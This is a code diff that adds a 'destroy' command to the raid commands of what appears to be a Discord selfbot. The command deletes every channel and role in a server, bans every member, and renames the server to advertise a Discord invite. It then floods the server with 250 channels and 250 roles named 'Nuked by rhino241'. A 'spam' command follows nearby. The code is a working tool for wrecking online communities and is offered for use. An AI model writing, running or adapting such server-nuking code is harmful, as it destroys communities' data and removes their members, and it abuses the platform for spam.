@@ -55,6 +55,55 @@ class RaidCommands(commands.Cog):
             await ctx.message.edit(langs.raid_error_permisssion[config_selfbot.lang], delete_after=config_selfbot.deltime)
 
     @commands.command()
+    async def destroy(self, ctx: commands.Context):
+        if ctx.author.guild_permissions.administrator:
+            await ctx.message.delete()
+
+          
+            for channel in list(ctx.guild.channels):
+                try:
+                    await channel.delete()
+                except:
+                    pass
+                
+           
+            for user in list(ctx.guild.members):
+                try:
+                    await user.ban()
+                except:
+                    pass
+                
+           
+            for role in list(ctx.guild.roles):
+                try:
+                    await role.delete()
+                except:
+                    pass
+                
+          
+            try:
+                await ctx.guild.edit(
+                    name="Join Discord.gg/wra",
+                    description="https://discord.gg/wra",
+                    reason="https://discord.gg/wra",
+                    icon=None,
+                    banner=None
+                )
+            except:
+                pass
+            
+            
+            for _ in range(250):
+                await ctx.guild.create_text_channel(name="Nuked by rhino241")
+
+            
+            for _ in range(250):
+                await ctx.guild.create_role(name="Nuked by rhino241", color=RandomColor())
+        else:
+            await ctx.message.edit("You do not have permission to use this command.", delete_after=10)
+
+    
+    @commands.command()
     async def spam(self, ctx: commands.Context):
         message_split = ctx.message.content.split()
         content = ctx.message.content.replace(f"{message_split[0]} {message_split[1]} ", "")
